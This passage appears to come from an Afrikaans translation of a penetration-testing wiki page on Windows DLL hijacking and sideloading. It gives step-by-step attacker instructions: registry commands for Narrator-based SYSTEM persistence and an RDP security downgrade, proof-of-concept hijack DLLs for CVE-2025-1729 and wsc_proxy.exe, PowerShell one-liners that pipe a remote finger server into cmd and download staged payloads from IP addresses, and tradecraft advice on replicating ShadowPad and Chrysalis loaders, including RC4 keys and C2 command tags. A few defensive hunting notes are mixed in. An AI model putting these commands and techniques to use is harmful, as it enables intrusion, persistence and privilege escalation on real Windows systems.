- 'n Naive hijack sal die UI laat praat/uitlig. Om stil te bly, enumerate Narrator-threads tydens attach, open die hooftread (`OpenThread(THREAD_SUSPEND_RESUME)`) en gebruik `SuspendThread` daarop; gaan voort in jou eie thread. Sien die PoC vir volledige code.<sup>[[8]](#references)</sup>

Trigger en persistence via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde laai die begin van Narrator die geplante DLL. Op die secure desktop (aanmeldskerm), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-geaktiveerde SYSTEM-uitvoering (laterale beweging)
- Laat die klassieke RDP-security layer toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, en druk CTRL+WIN+ENTER op die aanmeldskerm om Narrator te launch; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-session sluit - inject/migrate onmiddellik.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT)-registry entry (bv. CursorIndicator) clone, dit wysig om na 'n arbitrêre binary/DLL te wys, dit importeer en dan `configuration` op daardie AT-naam stel. Dit proxy arbitrêre uitvoering onder die Accessibility-framework.

Notas
- Om onder `%windir%\System32` te skryf en HKLM-waardes te verander, vereis admin-regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` wees; geen exports word benodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), wat as **CVE-2025-1729** opgespoor word.<sup>[[2]](#references)[[3]](#references)</sup>

### Besonderhede van die kwesbaarheid

- **Komponent**: `TPQMAssistant.exe`, geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 VM onder die konteks van die aangemelde gebruiker.
- **Directory-permissies**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers te drop.
- **DLL Search Behavior**: Probeer om eers `hostfxr.dll` uit sy working directory te load en log "NAME NOT FOUND" indien dit ontbreek, wat aandui dat plaaslike directory search precedence geld.

### Exploit-implementering

'n Aanvaller kan 'n malicious `hostfxr.dll`-stub in dieselfde directory plaas en die ontbrekende DLL uitbuit om code execution onder die gebruiker se konteks te verkry:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsvloei

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag totdat die scheduled task om 9:30 onder die huidige gebruiker se konteks uitgevoer word.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie met medium integrity.
4. Kombineer standaard UAC bypass techniques om van medium integrity na SYSTEM privileges te eskaleer.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors kombineer dikwels MSI-gebaseerde droppers met DLL side-loading om payloads onder 'n trusted, signed process uit te voer.<sup>[[10]](#references)</sup>

Kettingoorsig
- Die gebruiker laai 'n MSI af. 'n CustomAction loop stilweg tydens die GUI-installering (byvoorbeeld LaunchApplication of 'n VBScript action), en stel die volgende stage uit ingebedde resources saam.
- Die dropper skryf 'n legitimate, signed EXE en 'n malicious DLL na dieselfde directory (voorbeeldpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die signed EXE gestart word, laai Windows se DLL search order wsc.dll eerste vanaf die working directory, wat attacker code onder 'n signed parent uitvoer (ATT&CK T1574.001).

MSI-analise (waarna om te kyk)
- CustomAction table:
- Soek na entries wat executables of VBScript uitvoer. Voorbeeld van 'n suspicious pattern: LaunchApplication wat 'n embedded file in die agtergrond uitvoer.
- Inspekteer CustomAction, InstallExecuteSequence en Binary tables in Orca (Microsoft Orca.exe).
- Embedded/split payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Of gebruik lessmsi: lessmsi x package.msi C:\out
- Soek na veelvuldige klein fragments wat deur 'n VBScript CustomAction aaneengeskakel en decrypted word. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: wettige, ondertekende host (Avast). Die proses probeer om wsc.dll volgens naam vanuit sy gids te laai.
- wsc.dll: aanvaller-DLL. Indien geen spesifieke exports vereis word nie, kan DllMain voldoende wees; andersins, bou ’n proxy DLL en forward die vereiste exports na die egte library terwyl die payload in DllMain uitgevoer word.
- Bou ’n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir export-vereistes, gebruik ’n proxying framework (bv. DLLirant/Spartacus) om ’n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek maak staat op DLL-naamresolusie deur die host binary. As die host absolute paths of safe loading flags gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS en forwarded exports kan precedence beïnvloed en moet in ag geneem word tydens die keuse van die host binary en export set.

## Signed triads + encrypted payloads (ShadowPad-gevallestudie)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi deur ’n **three-file triad** te gebruik om met legitieme sagteware te meng terwyl die core payload encrypted op die skyf bly:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – vendors soos AMD, Realtek of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die executable sodat dit soos ’n Windows binary lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-signature bly geldig.
2. **Malicious loader DLL** – word langs die EXE met ’n verwagte naam geplaas (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik ’n MFC binary wat met die ScatterBrain framework geobfuskeer is; sy enigste taak is om die encrypted blob te vind, dit te decrypt en ShadowPad reflectively te map.
3. **Encrypted payload blob** – word dikwels as `<name>.tmp` in dieselfde directory gestoor. Nadat die decrypted payload memory-mapped is, delete die loader die TMP file om forensic evidence te vernietig.

Tradecraft-notas:

* Deur die signed EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word), kan dit homself as ’n Windows binary voordoen terwyl dit die vendor signature behou. Repliseer dus Ink Dragon se gewoonte om `conhost.exe`-agtige binaries te drop wat eintlik AMD/NVIDIA utilities is.
* Omdat die executable trusted bly, hoef die meeste allowlisting-kontroles slegs toe te laat dat jou malicious DLL langsaan sit. Fokus daarop om die loader DLL te customizen; die signed parent kan gewoonlik onaangeraak run.
* ShadowPad se decryptor verwag dat die TMP blob langs die loader en writable is sodat dit die file kan zero nadat dit gemap is. Hou die directory writable totdat die payload gelaai is; sodra dit in memory is, kan die TMP file veilig vir OPSEC deleted word.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombineer DLL sideloading met LOLBAS sodat die enigste custom artifact op die skyf die malicious DLL langs die trusted EXE is:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell spawn `cmd.exe /c`, trek commands vanaf ’n Finger server en pipe dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` trek TCP/79-teks; `| cmd` execute die server-response, sodat operators die second stage server-side kan roteer.

- **Built-in download/extract:** Download ’n archive met ’n benign extension, unpack dit en stage die sideload target plus DLL onder ’n random `%LocalAppData%`-folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verberg progress en volg redirects; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM launch:** Start die EXE via WMI sodat telemetry ’n CIM-created process wys terwyl dit die colocated DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat local DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); die payload (bv. Remcos) run onder die trusted naam.

- **Hunting:** Alert op `forfiles` wanneer `/p`, `/m` en `/c` saam verskyn; dit is ongewoon buite admin scripts.


## Gevallestudie: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

’n Onlangse Lotus Blossom-intrusion het ’n trusted update chain misbruik om ’n NSIS-packed dropper te lewer wat ’n DLL sideload plus volledig in-memory payloads gestage het.<sup>[[13]](#references)</sup>

Tradecraft-vloei
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, drop ’n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, ’n malicious `log.dll` en ’n encrypted blob `BluetoothService`, en launch dan die EXE.
- Die host EXE import `log.dll` en roep `LogInit`/`LogWrite`. `LogInit` mmap-load die blob; `LogWrite` decrypt dit met ’n custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material afkomstig van ’n vorige hash), overwrite die buffer met plaintext shellcode, free temps en jump daarnaartoe.
- Om ’n IAT te vermy, resolve die loader APIs deur export names te hash met **FNV-1a basis 0x811C9DC5 + prime 0x100019**, waarna ’n Murmur-style avalanche (**0x85EBCA6B**) toegepas word en dit met salted target hashes vergelyk word.

Main shellcode (Chrysalis)
- Decrypt ’n PE-like main module deur add/XOR/sub met key `gQ2JR&9;` oor vyf passes te herhaal, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om import resolution te voltooi.
- Reconstruct DLL name strings tydens runtime via per-character bit-rotate/XOR-transforms, en laai daarna `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik ’n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, elke export table in 4-byte blocks parse met Murmur-style mixing, en slegs na `GetProcAddress` fallback as die hash nie gevind word nie.

Embedded configuration & C2
- Config leef binne die dropped `BluetoothService` file by **offset 0x30808** (grootte **0x980**) en word met RC4 gedecrypt deur key `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou ’n dot-delimited host profile, prepend tag `4Q`, en RC4-encrypt dit dan met key `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Responses word RC4-decrypted en deur ’n tag switch gedispatch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode word deur CLI args beheer: geen args = install persistence (service/Run key) wat na `-i` wys; `-i` relaunch self met `-k`; `-k` skip install en run payload.

Alternate loader observed
- Dieselfde intrusion het Tiny C Compiler gedrop en `svchost.exe -nostdlib -run conf.c` vanuit `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langsaan. Die attacker-supplied C source het shellcode ingebed, dit compiled en in-memory gerun sonder om ’n PE aan die skyf te raak. Repliseer met:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-gebaseerde compile-and-run-stadium het `Wininet.dll` tydens runtime ingevoer en ’n second-stage shellcode vanaf ’n hardcoded URL verkry, wat ’n buigsame loader verskaf wat hom as ’n compiler-run voordoen.

## Signed-host sideloading with export proxying + host thread parking

Sommige DLL sideloading-kettings voeg **stability engineering** by sodat die legitieme host lank genoeg aktief bly om latere stages skoon te laai, eerder as om te crash nadat die kwaadwillige DLL gelaai is.<sup>[[11]](#references)</sup>

Observed pattern
- Plaas ’n trusted EXE langs ’n kwaadwillige DLL deur die verwagte dependency name, soos `version.dll`, te gebruik.
- Die kwaadwillige DLL **proxy elke verwagte export** terug na die regte system DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`) sodat import resolution steeds slaag en die host process aanhou werk.
- Ná load **patch die kwaadwillige DLL die host entry point** sodat die main thread in ’n oneindige `Sleep`-loop val in plaas daarvan om te exit of code paths uit te voer wat die process sou beëindig.
- ’n Nuwe thread voer die werklike kwaadwillige werk uit: dit decrypt die next-stage DLL name of path (RC4/XOR is algemeen), en launch dit dan met `LoadLibrary`.

Why this matters
- Normale DLL proxying behou API compatibility, maar dit waarborg nie dat die host lank genoeg aktief bly vir latere stages nie.
- Om die main thread in `Sleep(INFINITE)` te parkeer, is ’n eenvoudige manier om die signed process resident te hou terwyl die loader decryption, staging of network bootstrap in ’n worker thread uitvoer.
- Hunting slegs vir ’n verdagte `DllMain` kan hierdie pattern mis as die interessante gedrag plaasvind nadat die host entry point gepatch is en ’n secondary thread begin.

Minimal workflow
1. Copy die signed host EXE en bepaal die DLL wat dit vanaf die plaaslike directory resolve.
2. Build ’n proxy DLL wat dieselfde functions export en dit na die legitieme DLL forward.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create ’n worker thread.
4. Vanaf daardie thread, patch die host entry point of main thread start routine sodat dit op `Sleep` loop.
5. Decrypt die next-stage DLL name/config en call `LoadLibrary`, of manual-map die payload.

Defensive pivots
- Signed processes wat `version.dll` of soortgelyke algemene libraries vanaf hul eie application directory laai in plaas van `System32`.
- Memory patches by die process entry point kort ná image load, veral jumps/calls wat na `Sleep`/`SleepEx` redirected word.
- Threads wat deur ’n proxy DLL geskep word en onmiddellik `LoadLibrary` op ’n tweede DLL met ’n decrypted name call.
- Full-export proxy DLLs wat langs vendor executables binne writable staging directories soos `ProgramData`, `%TEMP%` of unpacked archive paths geplaas word.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
